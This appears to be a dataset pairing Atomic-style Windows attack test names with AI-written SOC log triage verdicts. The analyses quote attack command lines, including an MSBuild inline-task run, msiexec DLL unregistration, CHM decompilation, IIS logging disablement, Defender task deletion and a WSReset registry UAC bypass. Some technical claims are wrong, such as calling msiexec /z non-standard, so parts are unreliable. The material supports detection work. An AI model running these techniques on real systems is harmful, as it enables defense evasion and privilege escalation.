- **Process Activity:** Multiple processes `wevtutil.exe` and `conhost.exe` were also executed. While `wevtutil.exe` can be used for legitimate logging purposes, repeated execution could potentially indicate an attempt to modify or obscure event logs.
- **Command Line Executions:** This includes HOSTNAME.EXE and WHOAMI.EXE which are diagnostic tools. These might be used to gather information about the system's environment, likely to understand the context for executing further commands.
  
#### Security Logs:
- **Group Membership:** An event (4799) related to ""Enumerated User Access Rights"" is logged, originating from a `Microsoft Edge Update` setup. While this may be part of normal update activities, its association with user access enumeration requires attention.

### Assessment

#### Indicators of Suspicious Activity
- **PowerShell Use:** The specific PowerShell script execution to connect and modify Azure resources is not typical in routine operations without explicit permissions and logging.
- **Process Creation Patterns:** Usage of `wevtutil.exe` combined with the PowerShell activity could suggest attempts to obscure log entries or remove sensitive logs post-activity.
- **Automation and Scheduling:** No direct indications of automation or scheduling breaches are evident, but the frequent setup executions in Sysmon suggest intensive update or installation activity.
  
### Threats or Risks Identified
- **Potential Unauthorized Azure Operations:** The attempt to modify or remove Azure resources through scripts could lead to data loss, unauthorized changes, or preparatory steps for broader exploitation.
- **Log Manipulation:** Suspicion around `wevtutil.exe` calls points towards possible log tampering to cover tracks.

### Recommendation
Further investigation should focus on:
- **Validation of Azure Credentials:** Ensure the credentials and operations on Azure are verified and aligned with authorized access and organizational policy.
- **Examine Azure Activity Logs:** Cross-reference Azure logs to confirm unauthorized access attempts or actions.
- **Investigate Job Scheduling:** Ensure no suspicious cron jobs or task schedules are automating such tasks.
- **User Behavior Analysis:** Understand the behavior and necessity behind these actions from `SERVER002\admin_test`.

### Conclusion
Based on the collected evidence, the overall resolution for these logs can be marked as:

**SUSPICIOUS** - The activity appears unusual and deviates from standard operations needing further investigation, especially concerning Azure security and potential obscuration of system logs."
MSBuild Bypass Using Inline Tasks (C#),"**Analysis of the Windows Event Logs:**

Upon examination of the Sysmon logs provided, certain events stand out as potentially suspicious, suggesting that further investigation could be warranted:

1. **Windows PowerShell Execution:**
   - A PowerShell instance (`powershell.exe`) was executed by `SERVER002\admin_test`. While PowerShell is a legitimate tool, its use by accounts without legitimate administrative tasks, or invoking scripts, can be a hallmark of initial system reconnaissance or lateral movement in an attack.

2. **CMD.exe with MSBuild:**
   - The execution of `cmd.exe` with the command to compile using `MSBuild.exe` from an unexpected directory is noteworthy. Specifically:
     ``` 
     CommandLine: ""cmd.exe"" /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\data.001.csproj""
     ```
   - This use of `MSBuild` for compiling projects in temporary directories is often associated with ""living off the land"" tactics, where an attacker uses built-in tools for execution without dropping malicious binaries.

3. **Wevtutil.exe Invocation:**
   - Multiple instances of `wevtutil.exe` by `SERVER002\admin_test`. This tool is for managing Windows event logs and could have been used for log clearance or other nefarious activities to cover tracks.
   
4. **Execution of Whoami and Hostname:**
   - The sequence of using `whoami.exe` and `hostname.exe` can indicate an attempt to gather information about the user context and host environment in which the malicious actor is operating.

5. **Unusual Microsoft Edge Update Activity:**
   - The continuous invocation of `MicrosoftEdgeUpdate.exe` with different parameters indicates legitimate behavior related to software updates. However, excessive or unexpected update processes can sometimes be leveraged for persistence or camouflage.

**Assessment and Resolution:**

- **SUSPICIOUS**: There are activities logged that do not necessarily confirm malicious intent, but their pattern and nature warrant further investigation. The use of `MSBuild` within scripts found in temporary directories, combined with the execution of `cmd.exe` from unusual contexts, suggests that someone might be using ""living off the land"" techniques potentially linked to malicious actions. The use of wevtutil might be benign but could also signify attempts to clear or tamper with logs. 

**Next Steps:**

1. **Further Investigation:**
   - Analyze historical usage patterns of `MSBuild.exe` and `wevtutil.exe` on `SERVER002`.
   - Evaluate the legitimacy of `SERVER002\admin_test` account's activity. Scrutinize its recent login/logoff records and inspect group memberships and privileges.

2. **Review PowerShell Logs:**
   - Correlate these entries with PowerShell logs, if available, to extract any scripts or commands.

3. **Temporary Files Examination:**
   - Review files from `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\` path for unusual files or scripts.

4. **Security Measures:**
   - Consider implementing advanced threat protection solutions that can provide more context and potentially block such ""living off the land"" attack techniques.

In conclusion, these activities should not be immediately deemed malicious without additional context, but given their suspicious nature, further investigation is necessary to ensure the integrity of the system."
Create ADS PowerShell,"Upon analyzing the provided Windows event logs, a few observations stand out that may need further investigation:

1. **PowerShell Activity:**
   - A PowerShell script is executing commands using the alternate data stream (ADS) feature, indicated by multiple ""set-content"" commands with the ""-stream"" parameter. While ADS usage is not inherently malicious, it's often leveraged by attackers to hide data or scripts on the system.

2. **Sysmon and Process Execution:**
   - Several Sysmon logs indicate the execution of standard Windows executables like `powershell.exe`, `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and several components of Microsoft Edge Update. While the execution of these processes is common, their context (e.g., the use of PowerShell for script execution) raises suspicion if they are not part of normal administrative activities.
   - The recurring execution of `MicrosoftEdgeUpdate.exe` and its components, alongside multiple instances of service start/stops, could indicate legitimate update processes. However, the high frequency of these events merits verification against expected update schedules.

3. **Security Log:**
   - There are logon events for the SYSTEM account with high privileges and subsequent privilege assignments (such as SeDebugPrivilege, SeTakeOwnershipPrivilege) which can be concerning if they are not part of standard operations.

**Assessment:**

- The scripted usage of PowerShell with alternate data streams can be considered suspicious unless confirmed as part of legitimate administrative or monitoring activities.
- The multiple executions of standard Windows processes should be cross-verified for any running scheduled tasks, software updates, or administrative scripts that could justify these logs.

**Verdict:**

- **SUSPICIOUS** - The activity in the logs does not have immediate evidence of malicious intent; however, the use of PowerShell with alternate data streams and the frequency of Microsoft Edge Update logs, paired with SYSTEM-level activities, demands further investigation to ensure no unauthorized actions are taking place.
  
**Guidance:**

- Review recent administrative activities and confirm whether the PowerShell scripts and frequent service actions align with legitimate tasks or updates.
- Consider employing additional security tools to monitor PowerShell script execution, and audit logging configurations to capture more comprehensive details on script activities.
- Validate the updates related to Microsoft Edge and verify their origin and integrity. If this aligns with scheduled updates or installations, the logs may be benign.
  
Continued vigilance and validation of these activities are recommended to rule out any potential threats fully."
Invoke CHM Simulate Double click,"Following an analysis of the provided Windows event logs, here is a detailed assessment of the activities logged:

1. **PowerShell Usage:**
   - Multiple instances of PowerShell execution are noted. While PowerShell is a legitimate tool used by system administrators, it is also commonly exploited by attackers for malicious purposes. Of particular note:
     - `powershell.exe & {Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm}` appears suspicious. The use of `Invoke-ATHCompiledHelp` with a .chm file could potentially indicate the use of a help file to execute code, a known tactic in attacks.
     - `powershell.exe -ExecutionPolicy Restricted` is notable because it indicates that the script is not altering the execution policy to bypass restrictions. However, it performs actions that deserve attention, such as iterating through .inf files under the Windows directory, which can potentially locate vulnerable or misconfigured files.
   
2. **Processes of Interest:**
   - Legitimate Windows binaries such as `wevtutil.exe`, `whoami.exe`, and `hostname.exe` are executed by the user `SERVER002\admin_test`. These utilities are typically used for log management and system information retrieval. While not inherently malicious, their usage pattern may warrant further investigation to ascertain legitimacy in the context.
  
3. **User and System Context:**
   - The logs reflect significant activity by the `admin_test` user, with high integrity level processes being executed. While administrators commonly execute high-privileged commands, verification of intended administrative tasks is recommended.
   - Execution of scripts and commands by the `NT AUTHORITY\SYSTEM` user observing PowerShell processes such as `powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';` appears benign based on its logged output intention, yet warrants typical caution due to the power the `SYSTEM` account holds.

4. **Command-line Arguments and Patterns:**
   - Scripts executing without obvious malicious command-line arguments, however, using obfuscated or encoded commands, which is a common sign of evasion attempts, are absent here.

5. **Updates and General System Administration:**
   - System logs show Windows Update operations focused on common Microsoft applications and features. Regular updates are a healthy sign of system maintenance.

6. **Execution Patterns:**
   - Conhost.exe accompanies several processes. This is generally expected behavior when command-line tools or scripts are executed on Windows.

**Overall Assessment:**
- While some activities raise questions (e.g., the use of `Invoke-ATHCompiledHelp`), they do not definitively indicate a compromise solely based on the logs provided. Further context regarding the execution of these commands, known legitimate tasks corresponding to these events, and user intent is required.

Based on these logs, the resolution would be categorized as **SUSPICIOUS**. It is advised to:
- Verify the legitimacy of the PowerShell scripts executed.
- Ensure that monitored PowerShell usage aligns with planned administrative tasks.
- Consider potential indicators of lateral movement or privilege escalation attempts.
- Cross-reference with network and user activity logs to corroborate activities, ensuring no lateral movement or unauthorized data access based on role and action.

Further investigation is recommended to validate if these activities were expected and authorized (e.g., contacting the user, correlating events with known tasks or system changes)."
Delete an entire folder - Windows PowerShell,"### Detailed Log Analysis

Upon examining the provided Windows event logs, I have made the following observations regarding potential suspicious or anomalous activities:

1. **PowerShell Activity:**
   - There is a PowerShell command executed by the user `SERVER002\admin_test` which removes items from the temporary directory (`Remove-Item -Path $env:TEMP\deleteme_folder_data.004 -Recurse`). Although this action alone is not inherently malicious, PowerShell is often used by attackers to execute scripts maliciously. This specific command deletes data, which could indicate an attempt to cover tracks or clean up evidence of previous activity. The context of this removal needs closer examination. 

2. **Frequent Usage of Microsoft Edge Update:**
   - Microsoft Edge Update processes are executed by `NT AUTHORITY\SYSTEM` and involve different command-line arguments such as `/svc`, `/regsvc`, `/regserver`, `/ping`, `/ua`, and various setups. The constant updating and installation actions are typical for auto-update processes, given the presence of official Microsoft applications and valid hashes. The presence of these processes alone seems benign.

3. **Unusual Sequential Processes and Rapid Execution:**
   - Several other processes like `wevtutil.exe` and `conhost.exe` are observed being executed by `SERVER002\admin_test` in rapid succession. Multiple instances of `conhost.exe` following other utilities can sometimes be a sign of process spawning that requires system resource utilization analysis or scripting. However, because there is no unusual command-line usage or unexpected parent-child relationships observed, this is not definitively suspicious.

4. **Use of Built-in Windows Tools:**
   - Tools like `hostname.exe` and `whoami.exe` are run by the user `SERVER002\admin_test`. These could be part of a scripted administrative action, but they are also used by attackers to gather information post-exploitation. Their presence in isolation does not necessarily indicate malicious activity but should not be dismissed.

5. **System Integrity Level:**
   - Several activities are executed at a high system integrity level, which is common for administrative system processes but nevertheless worth confirming against user roles and access policies.

### Overall Assessment

- **Suspicious Elements Noted:**
  - The PowerShell script engineered to delete files situated within an administrative account context is unusual and may require further investigations into the necessity and origin of such scripts.
  - The simultaneous execution of various system utilities (like `whoami`, `hostname`, `powershell`, and `conhost`) by the same user over a brief period should be cross-referenced with routine operational scripts or security policies.

- **Benign Elements Confirmed:**
  - The frequent executions and updates by Microsoft Edge Update under `NT AUTHORITY\SYSTEM` is normal behavior for systems configured for automatic updates.
  - High integrity level processes initiated as part of the system or by system accounts appear consistent with typical administrative tasks.

### Guidance and Resolution

Given the analysis, the final resolution for this set of logs is **SUSPICIOUS**. Although there is no direct proof of compromise or unequivocal malicious activity, certain elements such as the PowerShell actions and rapid sequential executions warrant further review. I recommend:

1. **Review Policies**: Verify if the observed PowerShell commands align with expected system maintenance or administrative procedures.
2. **Correlate Logs**: Collate these events with network and other threat intelligence logs for related activities.
3. **Access Review**: Confirm the access level and session activity of `SERVER002\admin_test` during the timeframe of these logs.
4. **Audit Task Execution**: Determine if the sequential execution of the commands is consistent with system upgrade or maintenance scripts, and approve or block accordingly.

Further investigation should be conducted, focusing especially on the PowerShell activity and working backward from there for similar historical behavior."
Read volume boot sector via DOS device path (PowerShell),"### Detailed Analysis:

**System Log:**
- The system log entries primarily report on successful Microsoft Defender Antivirus updates. EventIDs 44, 43, and 19 relate to the installation of the Security Intelligence Update for Microsoft Defender Antivirus. This behavior is expected and not suspicious.

**Application Log:**
- The entries show a Windows service stopping (linked with the edgeupdate service) and Windows Defender reportedly in an ""ON"" state. This could be part of routine application stop/start during updates or normal system operation. There's no direct indication of anomaly or threat from these logs.

**Security Log:**
- Repeated events with EventID 5379 indicate Credential Validation failures. The return code `3221226021` generally indicates that a logon attempt has failed due to incorrect credentials or another authentication failure scenario. While consistent credential validation failures can suggest unauthorized access attempts, they could also result from a misconfiguration or an automated system process using incorrect credentials. Further context (like the origin of these attempts) would be necessary to assert malicious intent.

**Windows PowerShell Log:**
- PowerShell activity shows an invocation of a PowerShell script that reads and formats a byte array from the file system, specifically targeting the `C:` drive. This is atypical and could potentially indicate an attempt to read or manipulate directly from low-level system areas, possibly aiming at data exfiltration or system reconnaissance. This pattern warrants further investigation due to its potential malicious use case.

**Sysmon Log:**
- Numerous entries indicate the execution of various legitimate system processes, including `wuauclt.exe` (Windows Update Client), `whoami.exe` (displays logged-in user information), and several others related to system and application updates.
- A potentially suspicious event involves the execution of `powershell.exe` with a complex script involving `IO.FileStream` to read sectors of the disk. This pattern can signal malicious actions such as filesystem exploration or unauthorized data access.

### Assessment:

The logs suggest routine operations concerning system updates and normal application activity. However, there are some events that stand out as suspicious, particularly the PowerShell script that interacts directly with the file system in a potentially intrusive manner. Though this alone is not definitive of malicious activity, it does raise a red flag and warrants more detailed examination to determine its purpose and origin, as well as whether it aligns with legitimate operations or intentions.

### Resolution:

**SUSPICIOUS** - The presence of potential security issues like the unusual PowerShell script interaction with the file system leads to a determination that further investigation is necessary to ascertain if these activities are benign system functions or indicative of a compromise."
Delete Windows Defender Scheduled Tasks,"In the provided logs, we observe several events across different logs. Here's a detailed analysis of the logs:

### System Log Analysis:
- **Time Synchronization Events**: There are multiple events related to the time change and synchronization, specifically event IDs 24 and 1 from the ""Microsoft-Windows-Kernel-General"" provider. The time appears to be set backward, which can sometimes be associated with malicious activity to manipulate log timelines, but there are no additional suspicious activities directly linked with these events in the logs provided.
- **NTP Synchronization**: Event ID 35 from ""Microsoft-Windows-Time-Service"" shows synchronization with time.windows.com, which is typical for time synchronization and not necessarily suspicious.

### Security Log Analysis:
- **Event ID 4616**: It relates to system time changes associated with the ""LOCAL SERVICE"" account, via the process `svchost.exe`. While unusual time changes can be suspicious, there is no immediate evidence here indicating malicious use or privilege escalation directly from these entries alone.

### Application Log Analysis:
- **Software Protection Platform Service**: Event ID 16384 shows a routine check, not necessarily indicative of any malicious activity.

### Sysmon Log Analysis:
- **Command Execution**: There is a notable pattern of command execution involving `cmd.exe` with operations related to Windows Defender (such as querying and deleting scheduled tasks). The command-line arguments used here are related to checking and deleting scheduled tasks, specifically for Windows Defender tasks. This sequence can be considered suspicious if unauthorized, as it entails modifying task schedules for a security tool. 
- **Usage of `schtasks.exe`**: Commands were executed to check the existence of the task and then proceed to delete the scheduled Windows Defender tasks if they exist (`schtasks /delete`). While this can be a legitimate administrative action, it might also indicate malicious intent to disable security features if performed by unauthorized users.
- **Use of `wevtutil` and `hostname`**: The presence of these utilities might be standard, but combined with task deletion, could point to attempts at tampering with event logs or environment reconnaissance. 

### Conclusion:
- The pattern of commands observed appears to be systematically querying and removing Windows Defender scheduled tasks, which if unauthorized, is a clear attempt to disable or weaken endpoint security. This action, combined with observed command executions by potentially unauthorized processes, leans towards indicating potential malicious activity.

### Resolution:
Based on the above analysis:
- **Resolution**: **MALICIOUS**

### Guidance:
- Conduct a thorough review of the user `admin_test` and any accounts executing similar commands, checking for unauthorized access or abuse.
- Investigate any scripts or programs that could have triggered these actions.
- Monitor the affected host for further unusual activities and ensure Windows Defender is correctly reconfigured and operational.
- Consider implementing additional monitoring and alerting for changes to scheduled tasks, particularly those related to security tools, to swiftly detect and respond to similar activities in the future."
Msiexec.exe - Execute the DllUnregisterServer function of a DLL,"After a careful analysis of the provided logs, several points of interest emerge from the Sysmon logs related to process executions, particularly involving the Microsoft Edge Update process (`MicrosoftEdgeUpdate.exe`) and command executions. Here's a breakdown of the activity:

1. **Frequent Execution of Edge Update Processes:**
   - There are numerous entries of `MicrosoftEdgeUpdate.exe` and associated components running with elevated privileges (`NT AUTHORITY\SYSTEM`). These appear to be regular update-related activities. However, the frequency and the fact that they are executed from temporary directories (e.g., `C:\Program Files (x86)\Microsoft\Temp`) could warrant further investigation to ensure these are legitimate update processes.

2. **Execution of Potentially Suspicious Commands:**
   - The command `""cmd.exe"" /c c:\windows\system32\msiexec.exe /z ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\MSIRunner.dll""` is notable. This use of `msiexec.exe` with a `/z` argument is unusual (even though `/z` is not a standard argument) and executing a DLL in this manner can often be indicative of malicious intent to execute code.

3. **Use of ""whoami"" and ""hostname"":**
   - Execution of `whoami.exe` and `hostname.exe` is logged, which are generally benign utilities used to gather system information. However, in the context of unusual command-line executions and privileged access, these might indicate a reconnaissance phase of an attack.

4. **Process and Service Stop Notifications:**
   - Entries for services like `edgeupdate` being stopped are present, but without additional context or actions linked, individual service start/stop events are not necessarily indicative of nefarious activity.

### Assessment:

Given the evidence of unusual command-line executions involving `msiexec.exe` with non-standard arguments and processes initiated from temporary directories, this behavior can be considered suspicious, although not conclusively malicious without further context, such as the origin of the `MSIRunner.dll` or the specific content of these operations.

### Resolution:

- **SUSPICIOUS**: The logs exhibit potentially anomalous behavior that requires further investigation. The frequent execution of Microsoft Edge-related processes from temporary directories and the unusual use of `msiexec.exe` suggest the need for deeper inspection into these files and potential system changes. Immediate actions should include:
  - Verifying the legitimacy of the Microsoft Edge Update installations and associated files.
  - Investigating the source and integrity of `MSIRunner.dll`.
  - Reviewing security alerts or other logs that might correlate with these activities for additional context or confirmation of a legitimate software update.

Conducting these additional verifications will help ascertain whether these activities constitute a legitimate operation or an adversarial maneuver."
Allow Simultaneous Download Registry,"### Analysis

In the logs you provided, we can observe multiple events comprised mainly of Sysmon logs with Event ID 5 (Process End) and Event ID 1 (Process Creation). Here's a breakdown of the events:

1. **Processes and Applications:**
   - **wevtutil.exe** and **conhost.exe** appear in several entries. These are legitimate Windows processes related to event log management and console hosting respectively. Running as the user `SERVER002\admin_test` doesn’t pose a direct threat but can merit a follow-up depending on the context and frequency.
   - **whoami.exe** was executed to determine the current user. This can be a benign operation, but can also indicate a recon phase if correlated with other unusual activities.
   - **Change in Registry via cmd.exe and reg.exe**: Seeing `cmd.exe` executing with the parameters modifying registry settings using `reg.exe` under the context of `admin_test` might indicate an attempt to alter network settings. The `MaxConnectionsPerServer` and `MaxConnectionsPer1_0Server` parameters are being modified, which is unusual for an average user and could suggest a preparation for non-standard network communication.

2. **Network and System Utility Tools:**
   - **svchost.exe**, **TiWorker.exe**, and **TrustedInstaller.exe** run under `NT AUTHORITY\SYSTEM` are typical system maintenance processes and services; no anomalous behavior is observed here.
   - **MicrosoftEdgeUpdate.exe** running under `NT AUTHORITY\SYSTEM` is part of the routine update process for the Edge browser.

3. **Potential Concerns:**
   - The registry modification commands through `cmd.exe` are notably suspicious due to their potential to alter network traffic behavior per user preference, potentially by unauthorized personnel.
   - The lack of specific details about the security and system logs limits full context evaluation. However, the Sysmon logs provide clues about potentially unauthorized configuration changes.

### Conclusion and Resolution

The logs portray activities that appear typical for certain administrative functions, such as querying network settings and the running of system utilities. While some operations could align with normal administrative tasks because a specific user account (`admin_test`) is involved, the execution of registry changes without clear justification generally warrants caution.

Given the nature of modifications to registry settings related to network configuration—which could potentially be used to facilitate further reconnaissance or exfiltration—the activity is classified as **SUSPICIOUS**.

### Guidance

- **Review User Activities**: Investigate the actions of `admin_test`, checking for authorized context and necessity for the observed modifications, specifically focusing on the registry changes.
- **Correlate with Additional Logs**: Analyze additional event logs, such as security and application logs, if available, for unusual login attempts or privilege escalation that might further verify any suspicious behavior.
- **Environment Monitoring**: Continuously monitor this machine for further unusual activities, specifically related to unexpected network behavior and administrative actions.
- **Validate System Integrity**: Consider employing integrity verification of the registry settings and system files to ensure no unauthorized changes persist."
Disable Windows IIS HTTP Logging via PowerShell,"### Analysis of Logs

#### Application Logs
- The events predominantly consist of logs from the `edgeupdate` service indicating that the service was stopped twice in close succession. This might suggest an update process or a repeated attempt to stop a process, which could be benign but merits further review in the context of the overall system activity.

#### Security Logs
- The security logs show events related to time changes on the system (`EventID 4616`). Time changes can indicate potential tampering, but it's often a benign synchronization with time servers. In this context, the process involved is `svchost.exe`, a legitimate Windows service, acting under `NT AUTHORITY\LOCAL SERVICE`.

#### Sysmon Logs
- The execution of PowerShell with a command to modify IIS logging settings is a red flag. The use of the command:
  ```powershell
  set-WebConfigurationProperty -PSPath ""IIS:\Sites\Default Web Site\"" -filter ""system.webServer/httpLogging"" -name dontLog -value $true
  ```
  indicates an attempt to disable IIS logging. This action could be part of legitimate administration tasks or a sign of threat actor attempting to cover their tracks.
- There are multiple executions and operations related to Edge updates. While the Edge update service (`MicrosoftEdgeUpdate.exe`) processes seem legitimate, the extensive usage suggests something beyond normal; it may imply either an ongoing legitimate upgrade or potentially unwanted operations if not properly authenticated.
  
#### System Logs
- The logs show more synching of system time with `time.windows.com`, consistent with typical system operation under `SYSTEM` or `LOCAL SERVICE`. 

#### PowerShell Logs
- Logs indicate PowerShell sessions where the command to disable IIS logging via the command line above was executed. This process was running under `SERVER002\admin_test` with high integrity level, again pointing to either administrative tasks or potential misuse of credentials.

### Overall Assessment
The key observations point towards potentially suspicious behavior due to:
- Use of PowerShell to disable IIS logging, a common technique to obfuscate potentially malicious activity.
- Unusually frequent starting and stopping of the `edgeupdate` service suggests further investigation to confirm these aren't rogue update processes or attempts to introduce or maintain persistence.

**Resolution: SUSPICIOUS**

### Recommendations
- **Investigate the administrative accounts**: Verify the legitimacy of operations by `SERVER002\admin_test`. Ensure no unauthorized access or compromise of this account has occurred.
- **Review the change in IIS logging settings**: Identify who initiated it and validate if it was a legitimate change or unauthorized access.
- **Assess Edge Update processes**: Check the processes and sources since updates should align with known schedules or IT tasks.
- **Increase monitoring on suspicious activities**: Deploy additional monitoring solutions to catch any further attempts at disabling logging or unexpected behavior involving system services like PowerShell and Edge updates.
- **Examine for internal anomalies**: Check for other indicators of potentially compromised services, unauthorized privilege escalation, or lateral movement within the network."
Enforce Smart Card Authentication Through Registry,"After carefully analyzing the provided Windows event logs across various channels (Sysmon, System, Security, and Application logs), we can summarize the findings as follows:

### Suspicious & Anomalous Behavior:

1. **Registry Modification:**
   - The command `cmd.exe /c reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /t REG_DWORD /d 1 /f` was executed. Modifying the registry to change policies related to system settings can be indicative of an attempt to alter security configurations and may warrant further investigation.

2. **Process Execution & Permissions:**
   - There are several instances of processes being executed with `NT AUTHORITY\SYSTEM` privileges, including MicrosoftEdgeUpdate.exe running from a temporary directory, which is unusual if not part of a legitimate update or software installation.

3. **Time Change Events:**
   - The system time was adjusted backwards a few seconds. Although this might be harmless and caused by time synchronization via NTP, in the right context, such behavior can be part of an evasion technique to alter time-based security logs.

4. **Wevtutil and Conhost Usage:**
   - The repeated invocation of `wevtutil.exe` and `conhost.exe` by a user `admin_test` may be consistent with attempts to manipulate Windows event logs or run background processes under different contexts, particularly if not explained by routine administration activities.

### Threats & Risks Identified:

- **Potential Privilege Escalation:** Use of SYSTEM-level processes in combination with registry modifications could indicate an attempt to maintain persistence or escalate privileges.
- **Evasion Techniques:** Changes to system time and frequent use of wevtutil may suggest attempts to cover tracks or manipulate event logging.
- **Use of Unsigned Executables:** Execution of the MicrosoftEdgeUpdate.exe process from a temporary directory without clear context or verified digital signatures could reflect a malicious executable camouflaged as legitimate software.

### Guidance & Resolution:

- **Immediate Recommendations:**
  - **Audit and Monitor Registry Changes:** Check the context and justifications for modifying sensitive registry entries.
  - **Verify Process Legitimacy:** Confirm whether the executed processes are part of scheduled tasks, software updates, or administrative tasks by trusted personnel.
  - **Persistently Monitor User Activities:** Especially those performed by `admin_test` to ensure these actions are expected and authorized.

- **Further Investigation:**
  - Review surrounding logs or alerts to understand the full context of unusual events, such as registry modifications and system time changes.
  - Use threat intelligence sources or sandbox analysis to verify the integrity and legitimacy of suspected binaries like MicrosoftEdgeUpdate.exe in temporary directories.

Given the suspicious nature of the activities requiring further confirmation and investigation, the resolution for this set of logs is:

### SUSPICIOUS

Further investigation and verification are warranted to determine if these actions are indeed unauthorized or indicative of malicious intent."
Decompile Local CHM File,"Based on the analysis of the provided logs, here are my findings:

### Suspicious and Anomalous Behavior
1. **Unusual PowerShell Activity**: 
   - A PowerShell process was executed from the `C:\Windows\System32\WindowsPowerShell\v1.0\` directory by the user `SERVER002\admin_test`. While PowerShell is a legitimate tool, it is often used by attackers for scripting attacks, especially when observed with no clear purpose in the logs.
   
2. **Usage of `wevtutil.exe`**: 
   - The `wevtutil.exe` process was executed multiple times by the same user `SERVER002\admin_test` in close succession. This utility is generally used for event log management and could be used by an attacker to clear logs to hide their activity.
   
3. **Command Line Anomalies with `cmd.exe`**:
   - The command line for `cmd.exe` includes a suspicious argument `hh.exe -decompile %temp% ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\data.001.chm""`. This decompression operation could be indicative of extracting malicious payloads from a compiled HTML help file (CHM).

4. **Excessive Use of `conhost.exe`**:
   - The `conhost.exe` process is typically a component used by the console windows. Its repeated and frequent spawning, especially when linked with PowerShell or cmd activity, may suggest an attempt to cover up or assist in malicious script execution.
   
5. **Frequent `MicrosoftEdgeUpdate.exe` Executions**:
   - Although the execution of `MicrosoftEdgeUpdate.exe` is a part of legitimate software updating, its excessive triggering along with temporary directory usage (`Microsoft\\Temp\\EU95AE.tmp`) can sometimes indicate attempts to establish persistence or conduct malicious updates.

### Malicious Indicators
- The use of `hh.exe` and `wevtutil.exe` under the same user session without legitimate context can potentially indicate the system is exploited if not otherwise part of usual administrative tasks.
- The `cmd.exe` executing with complicated command-line parameters is often a sign of automation scripts or attacks if unsanctioned.

### Assessment
The logs reveal various activities that, while not definitively malicious on their own without more context, collectively suggest suspicious behavior indicative of potential compromise. Notably, processes typically used by attackers (such as PowerShell and `wevtutil.exe`) are being used in a manner consistent with system reconnaissance or cleanup actions.

### Resolution
**SUSPICIOUS** - The activity identified suggests an examination beyond facial log analysis, possibly incorporating endpoint detection and response (EDR) tools or forensic analysis, as the cluster of activities deviates from standard administrative actions and might indicate lateral movement or data extraction preparation.

### Guidance
- **Extended Analysis**: Investigate the context of the `admin_test` account usage to ensure it aligns with standard operations.
- **Alert on PowerShell Use**: Enhance monitoring and alerting specifically around PowerShell and command line access anomalies.
- **Forensic Imaging and EDR Investigation**: Consider taking a snapshot of the current system state for more in-depth investigation.
- **Review and Tighten Security Policies**: Evaluate access controls and audit policies to ensure compliance with least privilege and stringent logging.

Given the indicators, further investigation is highly recommended to ensure the security of the host and the network it is connected to."
Setting Shadow key in Registry for RDP Shadowing,"Upon reviewing the provided logs, there are several noteworthy elements that require careful analysis. Here is a detailed breakdown:

1. **Security Log Analysis:**
   - Event ID 4634 indicates a user logoff (admin_test), which is generally routine.
   - Event ID 4672 shows that the user ""admin_test"" obtained special privileges, including SeDebugPrivilege and SeEnableDelegationPrivilege, which are sensitive and should be closely monitored for misuse.
   - Event ID 4624 indicates a successful login using NTLM authentication from an external system (DESKTOP-3HL5B2P) with IP `fe80::e3b5:5371:12a8:9c77`.

2. **Sysmon Log Analysis:**
   - Multiple invocations of `wevtutil.exe` and `host processes for conhost.exe` by ""admin_test"" may indicate an attempt to manipulate event logs or interact with console applications, which can be suspicious without explicit justification.
   - The launch of `powershell.exe` with the execution of a script containing `Invoke-CimMethod` modifying terminal services and policies indicates potential unauthorized changes to the system configuration. This PowerShell activity appears scripted and resembles an attempt to enable Remote Desktop shadowing and alter registry settings, which can be indicative of lateral movement or a persistence mechanism.

3. **Windows PowerShell Log Analysis:**
   - The PowerShell log confirms that a session was started using `New-CimSession` with commands to manipulate firewall rules and registry settings under ""Terminal Services"". This aligns with the suspicious activity noted above.

4. **Additional Application and System Logs:**
   - Noteworthy is the stopping of the `edgeupdate` service, though this alone is not immediately suspicious unless correlated with known issues or external advisories about this service.
   - System logs are sparse and do not provide significant insights beyond basic service operations.

**Assessment:**
- The PowerShell activity is concerning due to the nature of commands executed, which are often leveraged for unauthorized remote access setups or configuration changes without legitimate need or documentation.
- Obtaining multiple special privileges, especially `SeDebugPrivilege`, raises suspicion towards possible malicious intent when combined with PowerShell changes.
- Consistent usage of potentially sensitive system utilities by ""admin_test"" indicates a need for deeper investigation to rule out malicious intentions.

**Conclusion: SUSPICIOUS**
- While not definitively malicious, the activity logged is irregular and aligns with tactics often seen in exploitative behavior. It warrants further investigation, particularly looking into the context of these events and any alignment with user activity or administrative needs. Logs around 'admin_test' should be reviewed for historical patterns.
- Recommended actions include corroborating with network logs, verifying the legitimacy of the involved user account, and checking for any deviations in configured alerts for NTLM-based access or excessive privilege acquisitions.

**Guidance:**
- Conduct system integrity and security configuration checks to ensure no unauthorized changes persist.
- Consider enhanced monitoring and logging around PowerShell and associated privileged activities.
- Liaise with the concerned user or administrators to gather context about these activities.
- If trends of isolated or repeated behavior emerge, consider conducting a comprehensive incident response to ascertain the scope of potential compromise."
UAC Bypass with WSReset Registry Modification,"Based on the provided Windows event logs for the host Server002, a detailed analysis was conducted focusing on indicators of potentially malicious activities, suspicious behavior, and anomalies. Here is a breakdown of the analysis:

### Analysis:

1. **Windows PowerShell Logs:**
   - Observed that a PowerShell script was executed to create and modify registry items under `HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`. Specifically:
     - The registry is modified to add a `DelegateExecute` with an empty string and change the default value to start `cmd.exe` with `cmd.exe /c start cmd.exe`.
     - A hidden process (`Start-Process -FilePath ""C:\Windows\System32\WSReset.exe"" -WindowStyle Hidden`) was initiated.

2. **Security Logs:**
   - Multiple logon events (`EventID: 4624`) with Logon Type 3 (Network logon) identifying user `admin_test`.
   - `EventID: 4672` Privilege escalation events include privileges like `SeDebugPrivilege`, indicating potential for administrative actions that could manipulate system settings or processes.
   - There's a notable time proximity between logon/logoff and PowerShell command execution, suggesting possible remote script execution.

3. **Sysmon Logs:**
   - Execution of `wevtutil.exe` and `conhost.exe` from user `admin_test`, typically seen in logging or console operations but can be abused for process handling.
